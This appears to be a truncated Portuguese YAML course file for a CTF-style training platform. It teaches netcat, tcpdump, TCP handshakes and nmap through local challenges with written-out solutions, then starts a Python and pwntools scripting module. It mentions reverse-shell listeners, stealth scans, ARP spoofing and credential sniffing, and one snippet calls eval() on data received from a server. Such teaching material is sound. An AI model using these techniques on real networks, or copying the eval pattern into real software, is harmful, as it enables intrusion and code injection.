    Você aprenderá a capturar e decodificar tráfego de rede em tempo real com tcpdump e Wireshark, a estabelecer canais de comunicação brutos com netcat e sockets TCP/UDP, e a realizar varreduras metódicas com nmap identificando banners, firewalls e versões de serviços.
  resources:
  - name: Introdução a Redes e Comunicação por Sockets
    type: lecture
    video: https://www.youtube.com/watch?v=3QhU9jd03a0
    slides: https://pwn.college/networking
  - name: 'Guia Teórico: Three-Way Handshake do TCP e Portas Notórias'
    type: markdown
    content: |
      ### O Three-Way Handshake do Protocolo TCP

      O TCP (Transmission Control Protocol) é um protocolo orientado a conexão, garantindo entrega ordenada e confiável de pacotes. Antes de qualquer dado ser transmitido, o cliente e o servidor sincronizam seus números de sequência (*Sequence Numbers*) através de 3 etapas rigorosas:

      ```
      CLIENTE                                      SERVIDOR
         |                                             |
         |  1. [SYN] Seq = x                           |
         |-------------------------------------------->|
         |                                             |
         |  2. [SYN-ACK] Seq = y, Ack = x + 1          |
         |<--------------------------------------------|
         |                                             |
         |  3. [ACK] Seq = x + 1, Ack = y + 1          |
         |-------------------------------------------->|
         |                                             |
         |==== CONEXÃO ESTABELECIDA (Dados / PSH) =====|
      ```

      #### Passo a Passo das Flags:
      1. **SYN (Synchronize):** O cliente envia um pacote com a flag `SYN` levantada e um número de sequência inicial aleatório (`ISN = x`). Indica intenção de abrir canal.
      2. **SYN-ACK (Synchronize-Acknowledgment):** O servidor responde reconhecendo o pacote do cliente (`Ack = x + 1`) e transmitindo seu próprio número de sequência inicial (`Seq = y`).
      3. **ACK (Acknowledgment):** O cliente confirma o recebimento do SYN do servidor (`Ack = y + 1`). A partir deste momento, o socket está no estado `ESTABLISHED`.

      #### Principais Portas e Serviços Canônicos:
      * `21/TCP`: FTP (Transferência de arquivos em texto claro)
      * `22/TCP`: SSH (Acesso remoto criptografado)
      * `25/TCP`: SMTP (Envio de e-mails)
      * `53/UDP/TCP`: DNS (Resolução de nomes de domínio)
      * `80/TCP`: HTTP (Web em texto claro)
      * `443/TCP`: HTTPS (HTTP sobre TLS/SSL)
      * `445/TCP`: SMB (Compartilhamento de arquivos Windows / Active Directory)
      * `3389/TCP`: RDP (Área de trabalho remota da Microsoft)
  challenges:
  - id: net-nc-raw-socket
    name: Conexões Manuais com Netcat
    description: "### \U0001F4D6 Introdução Teórica\n\nEm redes de computadores baseadas na arquitetura TCP/IP, a maior parte\
      \ dos usuários e desenvolvedores interage exclusivamente com a **Camada de Aplicação (Camada 7 do modelo OSI)** através\
      \ de navegadores web (HTTP/HTTPS) ou clientes SSH. Esses protocolos encapsulam dados em cabeçalhos extensos, certificados\
      \ TLS e regras de formatação rígidas.\n\nNo entanto, a comunicação de rede no nível do sistema operacional ocorre na\
      \ **Camada de Transporte (Camada 4 — TCP ou UDP)** através de abstrações do kernel denominadas **Sockets de Rede**.\
      \ O utilitário **Netcat (`nc`)** — historicamente consagrado como o \"canivete suíço do TCP/IP\" — permite interagir\
      \ diretamente com a Camada 4, transmitindo e recebendo bytes crus através de `stdin` e `stdout` sem qualquer encapsulamento\
      \ adicional.\n\n```\n   [ Operador / Terminal ]\n             │ (Bytes puros via stdin / stdout)\n             ▼\n \
      \  [ Netcat (nc) ]\n             │ (Criação de socket TCP: socket(AF_INET, SOCK_STREAM))\n             ▼\n   [ Camada\
      \ de Transporte (TCP) ]\n             │ (Handshake de 3 vias: SYN -> SYN-ACK -> ACK)\n             ▼\n   [ Conexão Estabelecida\
      \ na Porta 31337 ]\n```\n\n#### O Ciclo de Vida dos Sockets de Rede\nNo nível de chamadas de sistema (syscalls) do Linux:\n\
      1. **Servidor (Listener):** Cria o socket (`socket`), vincula-o a um endereço IP e porta (`bind`), define a fila de\
      \ espera (`listen`) e bloqueia aguardando conexões (`accept`).\n2. **Cliente:** Cria o socket (`socket`) e dispara a\
      \ conexão contra o IP e porta do servidor (`connect`), iniciando o Three-Way Handshake. Uma vez estabelecido o canal,\
      \ os dados trafegam via `send()`/`recv()` (ou `read()`/`write()`).\n\n#### Relevância Ofensiva e Defensiva\n* **Segurança\
      \ Ofensiva (Red Team):** O Netcat é a ferramenta padrão para o recebimento de conexões reversas (*Reverse Shells*).\
      \ Ao explorar um alvo vulnerável, o atacante instrui a máquina comprometida a se conectar de volta para um listener\
      \ netcat (`nc -lvnp 4444`), contornando regras de firewall de entrada (inbound).\n* **Segurança Defensiva (Blue Team\
      \ / SysAdmin):** Permite realizar *Banner Grabbing* e auditorias rápidas em daemons desconhecidos. Analistas testam\
      \ se portas estão abertas e coletam assinaturas de versões em servidores de email (SMTP porta 25), servidores de terminal\
      \ ou roteadores sem a sobrecarga de ferramentas pesadas.\n\n---\n\n### \U0001F4BB Exemplos Práticos e Sintaxe\n\nO domínio\
      \ do Netcat exige conhecer seus modos de operação como cliente e como servidor:\n\n#### Comandos Essenciais e Flags\n\
      * `nc <IP> <PORTA>`: Conecta como cliente TCP ao endereço e porta indicados.\n* `nc -u <IP> <PORTA>`: Conecta utilizando\
      \ o protocolo UDP em vez de TCP.\n* `nc -lvnp <PORTA>`: Inicia um listener local aguardando conexões de entrada:\n \
      \ * `-l` (*listen*): Coloca o netcat em modo de escuta.\n  * `-v` (*verbose*): Exibe detalhes operacionais da conexão.\n\
      \  * `-n` (*numeric only*): Não resolve nomes via DNS (evita atrasos e vazamentos de tráfego).\n  * `-p <porta>` (*port*):\
      \ Define a porta local para escuta.\n* `nc -zv <IP> <PORTAS>`: Modo scan (*zero-I/O*), testa se as portas estão abertas\
      \ sem enviar dados.\n* `ss -tlpn`: Inspeciona todos os processos que estão ouvindo em portas TCP no host local.\n\n\
      #### Snippets de Terminal e Saídas Observadas\n\n1. **Iniciando um Listener de Teste:**\n   ```bash\n   $ nc -lvnp 4444\n\
      \   Listening on 0.0.0.0 4444\n   ```\n\n2. **Conectando e Realizando Banner Grabbing Manual:**\n   ```bash\n   $ nc\
      \ 127.0.0.1 22\n   SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\n   ```\n   *O banner do servidor SSH é exibido imediatamente\
      \ em texto plano.*\n\n3. **Verificação de Portas Locais em Escuta com `ss`:**\n   ```bash\n   $ ss -tlpn | grep 31337\n\
      \   LISTEN 0 1 127.0.0.1:31337 0.0.0.0:* users:((\"python3\",pid=1234,fd=3))\n   ```\n\n---\n\n### \U0001F3AF O que\
      \ fazer para resolver o desafio (Passo a Passo)\n\nPara concluir o desafio e capturar a flag no container pwn.college:\n\
      \n1. **Inicie o serviço do desafio:**\n   O binário `/challenge/net-nc-raw-socket` abre um servidor TCP na porta `31337`.\
      \ Como ele ocupa o terminal aguardando conexões, execute-o em segundo plano (*background*) adicionando um `&` ao final,\
      \ ou utilize um segundo terminal:\n   ```bash\n   /challenge/net-nc-raw-socket &\n   ```\n   *O serviço imprimirá: `[*]\
      \ Servidor escutando na porta 127.0.0.1:31337...`.*\n\n2. **Conecte-se à porta do serviço utilizando o Netcat:**\n \
      \  No mesmo terminal (ou no segundo terminal), invoque o `nc`:\n   ```bash\n   nc 127.0.0.1 31337\n   ```\n\n3. **Interaja\
      \ com o protocolo do servidor:**\n   Assim que o canal for aberto, o servidor enviará a mensagem de boas-vindas:\n \
      \  ```text\n   Bem-vindo ao netcat raw socket da Cyberguard!\n   Envie 'PING': \n   ```\n\n4. **Transmita a saudação\
      \ exigida:**\n   Digite exatamente `PING` e pressione `Enter`:\n   ```text\n   PING\n   ```\n\n5. **Capture e submeta\
      \ a flag:**\n   O servidor responderá com `PONG!` e emitirá a flag autorizada:\n   ```text\n   [+] PONG! Flag: pwn.college{...}\n\
      \   ```\n   *Dica avançada: Você também pode resolver o desafio em uma única linha:*\n   ```bash\n   echo \"PING\" |\
      \ nc 127.0.0.1 31337\n   ```\n   Copie a sequência no padrão `pwn.college{...}` e insira no portal para pontuar.\n"
  - id: net-tcpdump-sniffing
    name: Sniffing de Pacotes com Tcpdump
    description: "### \U0001F4D6 Introdução Teórica\n\nEm condições normais de operação, a pilha de rede do kernel Linux descarta\
      \ qualquer pacote recebido cuja porta de destino não possua um processo escutando ativamente. Além disso, se o tráfego\
      \ transitar pela rede local mas não for endereçado ao MAC/IP da máquina, a placa de rede ignora os quadros.\n\nA técnica\
      \ de **Sniffing de Pacotes (Captura Promíscua de Tráfego)** subverte esse comportamento. Quando um utilitário como o\
      \ **Tcpdump** é iniciado:\n1. Ele cria um socket de camada de enlace bruto (`socket(AF_PACKET, SOCK_RAW, ...)`).\n2.\
      \ O subsistema de rede do kernel copia todos os quadros e datagramas recebidos ou transmitidos pela interface especificada.\n\
      3. Esses pacotes são submetidos ao motor do **Berkeley Packet Filter (BPF)**, um interpretador de bytecode ultraotimizado\
      \ que roda diretamente no kernel space para descartar imediatamente pacotes irrelevantes antes que consumam ciclos de\
      \ CPU no espaço de usuário.\n\n```\n       [ Processo Emissor: net-tcpdump-sniffing ]\n                         │ (sendto\
      \ UDP port 44444)\n                         ▼\n             [ Interface de Loopback: lo ]\n             ┌───────────┴───────────┐\n\
      \             │                       │\n             ▼                       ▼\n      [ Pilha IPv4 Normal ]     [ AF_PACKET\
      \ Raw Socket ]\n                                     │\n                                     ▼\n                   \
      \         [ Filtro BPF no Kernel ] (udp port 44444)\n                                     │\n                      \
      \               ▼\n                              [ tcpdump -i lo -A ]\n                                     │\n    \
      \                                 ▼\n                          [ Payload em Texto Claro ]\n```\n\n#### A Interface de\
      \ Loopback (`lo`)\nA interface de loopback (`127.0.0.1` / `::1`) é uma interface puramente virtual gerenciada pelo kernel.\
      \ O tráfego que transita por ela nunca atinge circuitos de rede físicos e é frequentemente utilizado por microsserviços\
      \ e bancos de dados locais. Por padrão, muitos desenvolvedores supõem que comunicações em loopback são \"invisíveis\"\
      , transmitindo tokens confidenciais sem criptografia.\n\n#### Relevância Ofensiva e Defensiva\n* **Segurança Ofensiva\
      \ (Red Team / Man-in-the-Middle):** Em redes corporativas, atacantes realizam ataques de ARP Spoofing e posicionam sniffers\
      \ para capturar credenciais de protocolos legados não criptografados (HTTP, FTP, Telnet, LDAP simples, SNMP v1/v2c).\n\
      * **Segurança Defensiva (Blue Team / DFIR / SOC):** O `tcpdump` é a ferramenta de primeira resposta em incidentes de\
      \ segurança. Em servidores headless sem interface gráfica para rodar o Wireshark, o tcpdump permite isolar exfiltrações\
      \ de dados, beacons de Command & Control (C2) e ataques de negação de serviço em tempo real.\n\n---\n\n### \U0001F4BB\
      \ Exemplos Práticos e Sintaxe\n\nA captura e filtragem cirúrgica de pacotes com o `tcpdump` baseiam-se em flags e expressões\
      \ BPF:\n\n#### Parâmetros e Flags Críticas\n* `-i <interface>`: Define a interface de escuta. Para tráfego interno entre\
      \ processos na mesma máquina, use `-i lo`. Para interfaces de rede convencionais, use `-i eth0` ou `-i any`.\n* `-A`:\
      \ Renderiza o payload dos pacotes em caracteres legíveis ASCII na tela (ideal para inspecionar protocolos de texto).\n\
      * `-X`: Renderiza os bytes em hexadecimal e caracteres ASCII lado a lado.\n* `-nn`: Desativa a resolução de nomes de\
      \ domínio (DNS) e conversão de números de portas em serviços (ex: não converte porta 80 em `http`). Acelera drasticamente\
      \ a captura.\n* `-v` / `-vv`: Aumenta o nível de verbosidade exibindo TTL, identificação IP e opções TCP.\n* `-w <arquivo.pcap>`:\
      \ Grava os pacotes brutos capturados para abertura posterior no Wireshark.\n* `-r <arquivo.pcap>`: Lê e analisa um arquivo\
      \ de captura previamente salvo.\n\n#### Snippets Práticos e Saídas Observadas\n\n1. **Captura na Interface de Loopback\
      \ com Filtro BPF na Porta 44444:**\n   ```bash\n   $ tcpdump -i lo -A -nn udp port 44444\n   tcpdump: verbose output\
      \ suppressed, use -v[v]... for full protocol decode\n   listening on lo, link-type EN10MB (Ethernet), snapshot length\
      \ 262144 bytes\n   ```\n\n2. **Inspeção do Pacote Interceptado no Terminal:**\n   ```text\n   12:34:56.789123 IP 127.0.0.1.54321\
      \ > 127.0.0.1.44444: UDP, length 43\n   E..G..@.@.V...........4.../.CYBERGUARD_SNIFF_SECRET=tcpdump_mestre_2026\n  \
      \ ```\n   *Nota-se claramente a string transmitida no corpo do pacote UDP.*\n\n3. **Expressões BPF Comuns para Incident\
      \ Response:**\n   ```bash\n   # Capturar apenas pacotes TCP direcionados à porta 80 vindos de um host específico:\n\
      \   $ tcpdump -i eth0 -nn \"tcp dst port 80 and src host 192.168.1.100\"\n   ```\n\n---\n\n### \U0001F3AF O que fazer\
      \ para resolver o desafio (Passo a Passo)\n\nPara capturar o segredo transmitido na rede local e resgatar a flag:\n\n\
      1. **Inicie o sniffer no primeiro terminal:**\n   Configure o `tcpdump` para escutar na interface de loopback (`lo`),\
      \ filtrando o tráfego UDP na porta `44444` e exibindo os dados em ASCII:\n   ```bash\n   tcpdump -i lo -A -nn udp port\
      \ 44444\n   ```\n   *(Caso esteja utilizando uma única janela de terminal, envie o comando para segundo plano com `&`:)*\n\
      \   ```bash\n   tcpdump -i lo -A -nn udp port 44444 &\n   ```\n\n2. **Execute o binário do desafio:**\n   No mesmo terminal\
      \ (ou em um segundo terminal), dispare o programa gerador de tráfego:\n   ```bash\n   /challenge/net-tcpdump-sniffing\n\
      \   ```\n   *O programa avisará que está disparando pacotes UDP contendo o token secreto para a porta 44444 e aguardará\
      \ sua resposta no prompt:*\n   ```text\n   [?] Digite o token capturado no trafego: \n   ```\n\n3. **Inspecione a saída\
      \ do tcpdump:**\n   Localize no payload capturado pelo sniffer a chave transmitida:\n   ```text\n   CYBERGUARD_SNIFF_SECRET=tcpdump_mestre_2026\n\
      \   ```\n\n4. **Submeta o token capturado:**\n   O token corresponde exatamente ao valor após o sinal de igual: `tcpdump_mestre_2026`.\n\
      \   Insira o token no prompt e pressione `Enter`:\n   ```text\n   tcpdump_mestre_2026\n   ```\n\n5. **Capture e submeta\
      \ a flag:**\n   O validador confirmará a integridade do token e exibirá a flag autorizada:\n   ```text\n   [+] Captura\
      \ realizada com sucesso!\n   pwn.college{...}\n   ```\n   Copie a string no formato `pwn.college{...}` e submeta-a na\
      \ plataforma.\n"
  - id: net-tcp-handshake-analysis
    name: Dissecando o Handshake TCP no Wireshark/Tshark
    description: "### \U0001F4D6 Introdução Teórica\n\nDiferente do protocolo UDP (User Datagram Protocol), que opera sob\
      \ o princípio do \"melhor esforço\" sem confirmação de entrega, o **TCP (Transmission Control Protocol — RFC 793)**\
      \ é um protocolo estritamente orientado a conexão. Isso significa que nenhum byte de dados da Camada de Aplicação pode\
      \ ser transmitido antes que o cliente e o servidor sincronizem seus parâmetros de canal através de um procedimento de\
      \ três etapas conhecido como **Three-Way Handshake**.\n\n```\n   CLIENTE (Ex: 192.168.1.10)                       SERVIDOR\
      \ (Ex: 192.168.1.50:80)\n        │                                                        │\n        │  1. SYN (Flags:\
      \ [SYN], Seq = X)                        │\n        │───────────────────────────────────────────────────────>│  Estado\
      \ Servidor:\n        │                                                        │  SYN_RECEIVED\n        │           \
      \                                             │\n        │  2. SYN-ACK (Flags: [SYN, ACK], Seq = Y, Ack = X + 1)  │\n\
      \        │<───────────────────────────────────────────────────────│\n        │                                     \
      \                   │\nEstado Cliente:                                                  │\nESTABLISHED             \
      \                                         │\n        │                                                        │\n  \
      \      │  3. ACK (Flags: [ACK], Seq = X + 1, Ack = Y + 1)       │\n        │───────────────────────────────────────────────────────>│\
      \  Estado Servidor:\n        │                                                        │  ESTABLISHED\n        │    \
      \                                                    │\n        │══════════ CONEXÃO ESTABELECIDA / TRANSFERÊNCIA ════════│\n\
      ```\n\n#### As Três Etapas Rigorosas do Handshake\n1. **SYN (Synchronize):** O cliente envia um pacote com a flag `SYN`\
      \ ativada e um número de sequência inicial pseudoaleatório (*ISN = X*). Indica formalmente a intenção de abrir um canal\
      \ de comunicação.\n2. **SYN-ACK (Synchronize-Acknowledgment):** O servidor responde com as flags `SYN` e `ACK` ativadas.\
      \ Ele confirma o recebimento do pacote do cliente incrementando seu número de sequência (*Ack = X + 1*) e introduz seu\
      \ próprio número de sequência inicial (*Seq = Y*).\n3. **ACK (Acknowledgment):** O cliente responde com a flag `ACK`\
      \ ativada, confirmando o número de sequência do servidor (*Ack = Y + 1*). A partir deste instante, ambos os nós entram\
      \ no estado `ESTABLISHED` e a troca de dados em texto claro ou criptografado tem início.\n\n#### Tabela de Flags de\
      \ Controle do Cabeçalho TCP\n| Flag TCP | Bit Hexadecimal | Propósito Operacional | Cenário em Cibersegurança |\n| :---:\
      \ | :---: | :--- | :--- |\n| **SYN** | `0x02` | Sincroniza números de sequência para abrir canal | Início de conexões\
      \ legítimas e ataques SYN Flood |\n| **ACK** | `0x10` | Reconhece o recebimento ordenado de pacotes | Confirmação contínua\
      \ de entrega de segmentos |\n| **FIN** | `0x01` | Solicita o encerramento gracioso da conexão | Finalização ordenada\
      \ de sessões TCP |\n| **RST** | `0x04` | Aborta a conexão imediatamente (*Reset*) | Portas fechadas ou encerramento\
      \ de SYN scan |\n| **PSH** | `0x08` | Força envio imediato dos dados do buffer para a aplicação | Comandos interativos\
      \ em terminais SSH e shells |\n| **URG** | `0x20` | Informa a presença de dados de processamento urgente | Priorização\
      \ de interrupções de controle |\n\n#### Relevância Ofensiva e Defensiva\n* **Segurança Ofensiva (Red Team):** \n  -\
      \ **SYN Scans (Stealth Scan):** Ao realizar um scan com `nmap -sS`, o atacante envia o pacote `SYN`, recebe o `SYN-ACK`\
      \ e, em vez de responder com o `ACK` final, envia um `RST`. Isso determina que a porta está aberta sem concluir a conexão,\
      \ evitando que serviços legados registrem a tentativa em seus arquivos de log.\n  - **SYN Flood (DDoS):** Atacantes\
      \ enviam milhões de pacotes `SYN` com IPs de origem forjados (*spoofing*), saturando a tabela de estados (`SYN_RECV`)\
      \ do alvo e causando negação de serviço.\n* **Segurança Defensiva (Blue Team / SOC):** Analistas utilizam filtros no\
      \ Wireshark e Zeek para detectar discrepâncias em flags (como pacotes anômalos com flags `SYN+FIN`), monitorar o tempo\
      \ de resposta do handshake e configurar contramedidas no kernel como **SYN Cookies** (`net.ipv4.tcp_syncookies = 1`).\n\
      \n---\n\n### \U0001F4BB Exemplos Práticos e Sintaxe\n\nA inspeção e o diagnóstico do handshake TCP no Linux dependem\
      \ dos utilitários de inspeção de sockets e sniffers:\n\n#### Comandos de Inspeção e Filtros\n* `ss -ant`: Exibe todas\
      \ as conexões TCP numéricas (`-n`) ativas e em escuta (`-a`), indicando seu estado atual (`ESTAB`, `SYN-SENT`, `LISTEN`).\n\
      * `tcpdump -nn \"tcp[tcpflags] == tcp-syn\"`: Filtra exclusivamente os pacotes de solicitação inicial de conexão (onde\
      \ apenas o bit SYN está ativo).\n* `tcpdump -nn \"tcp[tcpflags] & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)\"`: Filtra\
      \ especificamente as respostas SYN-ACK dos servidores.\n* Filtros de Display no Wireshark:\n  * `tcp.flags.syn == 1\
      \ && tcp.flags.ack == 0`: Identifica pacotes SYN isolados (início).\n  * `tcp.flags.syn == 1 && tcp.flags.ack == 1`:\
      \ Identifica pacotes SYN-ACK (resposta do servidor).\n  * `tcp.flags.reset == 1`: Identifica conexões rejeitadas ou\
      \ abortadas com RST.\n\n#### Snippets de Terminal e Saídas Observadas\n\n1. **Visualizando Estados de Conexão no Linux\
      \ com `ss`:**\n   ```bash\n   $ ss -ant\n   State      Recv-Q Send-Q  Local Address:Port   Peer Address:Port\n   LISTEN\
      \     0      128         127.0.0.1:80           0.0.0.0:*\n   ESTAB      0      0       192.168.1.10:45678    192.168.1.50:80\n\
      \   SYN-SENT   0      1       192.168.1.10:45680    192.168.1.50:443\n   ```\n\n2. **Interceptando o Handshake Completo\
      \ via Tcpdump:**\n   ```text\n   12:00:00.100 IP 10.0.0.2.4000 > 10.0.0.1.80: Flags [S], seq 1000\n   12:00:00.105 IP\
      \ 10.0.0.1.80 > 10.0.0.2.4000: Flags [S.], seq 2000, ack 1001\n   12:00:00.106 IP 10.0.0.2.4000 > 10.0.0.1.80: Flags\
      \ [.], ack 2001\n   ```\n   *Note a notação compacta do tcpdump: `[S]` = SYN, `[S.]` = SYN-ACK, `[.]` = ACK puro.*\n\
      \n---\n\n### \U0001F3AF O que fazer para resolver o desafio (Passo a Passo)\n\nPara comprovar seu domínio teórico do\
      \ protocolo TCP e liberar a flag:\n\n1. **Invoque o binário do desafio:**\n   Execute `/challenge/net-tcp-handshake-analysis`\
      \ no terminal:\n   ```bash\n   /challenge/net-tcp-handshake-analysis\n   ```\n\n2. **Avalie o questionário interativo:**\n\
      \   O binário apresentará a seguinte questão:\n   ```text\n   === DESAFIO DO THREE-WAY HANDSHAKE TCP ===\n   Qual e\
      \ a sequencia exata dos 3 pacotes que iniciam uma conexao TCP?\n   1) SYN, ACK, SYN-ACK\n   2) SYN, SYN-ACK, ACK\n \
      \  3) ACK, SYN, SYN-ACK\n   Sua resposta (1, 2 ou 3): \n   ```\n\n3. **Submeta a resposta correta:**\n   A única sequência\
      \ canônica universal é:\n   - Pacote 1: **SYN** (Cliente -> Servidor)\n   - Pacote 2: **SYN-ACK** (Servidor -> Cliente)\n\
      \   - Pacote 3: **ACK** (Cliente -> Servidor)\n\n   Digite o número `2` e pressione `Enter`:\n   ```text\n   2\n   ```\n\
      \n4. **Alternativa via argumento direto:**\n   Você também pode resolver passando a resposta como argumento:\n   ```bash\n\
      \   /challenge/net-tcp-handshake-analysis 2\n   ```\n\n5. **Capture e submeta a flag:**\n   O sistema validará sua resposta\
      \ e exibirá a flag do desafio:\n   ```text\n   [+] Exato! SYN (cliente -> servidor) -> SYN-ACK (servidor -> cliente)\
      \ -> ACK (cliente -> servidor).\n   pwn.college{...}\n   ```\n   Copie a string no formato `pwn.college{...}` e insira\
      \ no portal da Cyberguard.\n"
  - id: net-nmap-recon
    name: Reconhecimento Ativo com Nmap
    description: |
      ### 📖 Introdução Teórica

      Em auditorias de segurança e testes de intrusão, a primeira fase operacional é a de **Reconhecimento Ativo (Active Reconnaissance)**. Seu objetivo primordial é mapear a superfície de ataque de um alvo, identificando quais endereços IP estão ativos, quais portas lógicas (de 1 a 65535) estão acessíveis e quais softwares e versões específicas estão respondendo por trás dessas portas.

      O **Nmap (Network Mapper)** é o padrão absoluto da indústria para varreduras de rede. Quando o Nmap sonda um host, ele interpreta as respostas da pilha TCP/IP para categorizar o estado de cada porta:

      ```
      [ Nmap Scanner ] ──( Pacote Probe: SYN )──> [ Alvo: Porta X ]
                                                         │
        ┌─────────────────┬──────────────────────────────┴──────────────────────────────┐
        │ Se Aberta:      │ Se Fechada:                                                 │ Se Filtrada (Firewall):
        ▼                 ▼                                                             ▼
      [ Responde SYN-ACK ] [ Responde RST-ACK ]                                           [ Nenhuma Resposta / ICMP Inalcançável ]
        │                 │                                                             │
        ▼                 ▼                                                             ▼
      Estado: OPEN      Estado: CLOSED                                                Estado: FILTERED
      ```

      #### Modos de Varredura e Técnicas de Detecção
      * **TCP SYN Stealth Scan (`-sS`):** O método de varredura mais popular. O Nmap envia um pacote SYN. Se o alvo responder com SYN-ACK, a porta é considerada `open`, mas o Nmap envia imediatamente um pacote RST em vez de completar a conexão com ACK. Por não concluir o handshake, aplicações que registram apenas conexões completas em log frequentemente não detectam a varredura. Requer privilégios administrativos (`root` ou `CAP_NET_RAW`).
      * **TCP Connect Scan (`-sT`):** Utiliza a chamada de sistema `connect()` padrão do sistema operacional, completando integralmente o Three-Way Handshake. Funciona com qualquer usuário comum sem privilégios de root, porém gera registros nos logs da aplicação-alvo.
      * **Version Detection (`-sV`):** Após identificar uma porta aberta, o Nmap envia uma série de sondas de aplicação (*probes*) e compara os banners retornados contra uma base de milhares de assinaturas, revelando o software e sua versão exata (ex: `Apache 2.4.41` ou `OpenSSH 8.9`).

      #### O Mito da Segurança por Obscuridade
      Uma prática comumente adotada de forma equivocada por administradores é alterar as portas padrão de serviços críticos (como mudar o SSH da porta 22 para 2222 ou serviços web da porta 80 para 8085). O Nmap torna essa medida ineficaz: uma varredura metódica localiza qualquer porta aberta em frações de segundo, provando que a verdadeira segurança decorre de controle de acesso rigoroso, criptografia e aplicação ágil de patches de segurança.

      #### Relevância Ofensiva e Defensiva
      * **Segurança Ofensiva (Red Team):** Permite descobrir servidores de homologação esquecidos, serviços de depuração internos expostos e aplicações desatualizadas vulneráveis a exploração direta através de vulnerabilidades públicas conhecidas (CVEs).
      * **Segurança Defensiva (Blue Team / Gestão de Superfície de Ataque):** Analistas executam varreduras contínuas para detectar imediatamente a introdução de novos serviços na rede corporativa, servidores Shadow IT configurados sem autorização ou backdoors instalados por invasores.

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A execução metódica de varreduras com Nmap exige a combinação adequada de parâmetros:

      #### Parâmetros e Flags Fundamentais
      * `-p <portas>`: Especifica o intervalo de portas a serem escaneadas (ex: `-p 8080-8090`, `-p 22,80,443`, `-p-` para todas as 65535 portas).
      * `-sS`: Executa o scan SYN stealth (requer privilégios de root).
      * `-sT`: Executa o scan via chamada de sistema connect (usuário desprivilegiado).
      * `-sV`: Ativa a detecção profunda de versões de serviços.
      * `-sC`: Executa o conjunto padrão de scripts em linguagem Lua (*Nmap Scripting Engine - NSE*).
      * `-T<0-5>`: Define o perfil de temporização da varredura, variando de `-T0` (paranóico/evasivo) até `-T4` (agressivo/rápido) e `-T5` (insano).
      * `-Pn`: Trata todos os hosts como ativos (ignora a descoberta inicial via ping ICMP).

      #### Snippets Práticos e Saídas Observadas

      1. **Varredura em Intervalo Restrito de Portas (`-p 8080-8090`):**
         ```bash
         $ nmap -p 8080-8090 127.0.0.1
         Starting Nmap 7.80 ( https://nmap.org )
         Nmap scan report for localhost (127.0.0.1)
         Host is up (0.00012s latency).

         PORT     STATE  SERVICE
         8080/tcp closed http-proxy
         8081/tcp closed blackice-icecap
         8082/tcp closed blackice-alerts
         8083/tcp closed us-srv
         8084/tcp closed fn-val
         8085/tcp open   unknown
         8086/tcp closed d-s-n
         8087/tcp closed simplify
         8088/tcp closed radan-http
         8089/tcp closed unknown
         8090/tcp closed opsmessaging
         ```
         *Identificou-se imediatamente que apenas a porta `8085` está em estado `open`.*

      2. **Varredura com Detecção de Versão na Porta Localizada:**
         ```bash
         $ nmap -sV -p 8085 127.0.0.1
         ```

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Para localizar o serviço escondido entre as portas 8080 e 8090 e capturar a flag:

      1. **Inicie o daemon alvo do desafio:**
         O binário `/challenge/net-nmap-recon` vincula um serviço em uma porta aleatória dentro do intervalo 8080-8090. Execute-o em segundo plano:
         ```bash
         /challenge/net-nmap-recon &
         ```
         *O programa notificará:*
         ```text
         [*] Um servico foi iniciado em 127.0.0.1 entre as portas 8080 e 8090.
         [*] Faca um scan com 'nmap -p 8080-8090 127.0.0.1' e conecte-se a porta correta.
         ```

      2. **Execute a varredura com o Nmap:**
         Sonde o intervalo de portas especificado na interface local:
         ```bash
         nmap -p 8080-8090 127.0.0.1
         ```

      3. **Identifique a porta aberta:**
         Na tabela de resultados do Nmap, localize a linha cujo estado seja `open`. Você notará que a porta é a `8085/tcp`.

      4. **Conecte-se à porta aberta com o Netcat:**
         Dialogue diretamente com o serviço na porta descoberta:
         ```bash
         nc 127.0.0.1 8085
         ```

      5. **Capture e submeta a flag:**
         Ao aceitar a conexão na porta correta, o serviço transmitirá a validação e exibirá a flag:
         ```text
         [+] Porta localizada com sucesso! Flag: pwn.college{...}
         ```
         Copie a string no formato `pwn.college{...}` e insira no painel da plataforma para confirmar a conclusão do desafio.
- id: scripting-automacao
  name: 'Módulo 3: Programação e Scripting Ofensivo (Python & Bash)'
  description: |
    O diferencial de um profissional de elite em segurança é a capacidade de criar ferramentas personalizadas e automatizar interações complexas. Este módulo capacita você a programar scripts em Python e Bash para comunicação via sockets, manipulação de streams de texto e automação de exploits usando a renomada biblioteca `pwntools`.

    Além disso, você dominará o uso de `strace` e `ltrace` para rastrear chamadas de sistema (syscalls) e funções de biblioteca compartilhada em tempo de execução.
  resources:
  - name: Pwntools e Automação de Binários
    type: lecture
    video: https://www.youtube.com/watch?v=Fj7n0P4W64M
    slides: https://pwn.college/program-interaction
  - name: 'Guia Teórico: Arquitetura de Sockets em Python e Syscalls com Strace'
    type: markdown
    content: |
      ### Automação com Python e Sockets

      A biblioteca padrão `socket` permite interações diretas de baixo nível sobre TCP e UDP:

      ```python
      import socket

      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect(('127.0.0.1', 1337))

      # Leitura do banner
      banner = s.recv(1024).decode()
      print("[*] Recebido:", banner)

      # Envio de resposta calculada
      resposta = "resposta_calculada\n"
      s.sendall(resposta.encode())

      flag = s.recv(1024).decode()
      print("[+] Flag:", flag)
      s.close()
      ```

      ### Acelerando com Pwntools
      Para tarefas interativas e CTFs, a biblioteca `pwntools` reduz dezenas de linhas a instruções expressivas:
      ```python
      from pwn import *

      io = remote('127.0.0.1', 1337)
      io.recvuntil(b"Calcule: ")
      expressao = io.recvline().strip().decode()
      resultado = str(eval(expressao)).encode()
      io.sendline(resultado)
      print(io.recvall().decode())
      ```

      ### Depuração com Strace e Ltrace
      * **`strace` (System Call Trace):** Intercepta e registra todas as chamadas que o programa faz diretamente ao kernel Linux (`open`, `read`, `write`, `socket`, `connect`, `execve`). Se um binário tenta ler um arquivo secreto, o `strace` revelará o caminho exato!
      * **`ltrace` (Library Call Trace):** Intercepta chamadas a bibliotecas dinâmicas em C (`strcmp`, `printf`, `malloc`, `strlen`). Muito útil para comparar senhas passadas em funções de verificação ingênuas.
  challenges:
  - id: script-bash-loop
    name: Automação em Bash e Manipulação de Arquivos
    description: "### \U0001F4D6 Introdução Teórica\n\nO diferencial de um profissional de elite em segurança ofensiva e defensiva\
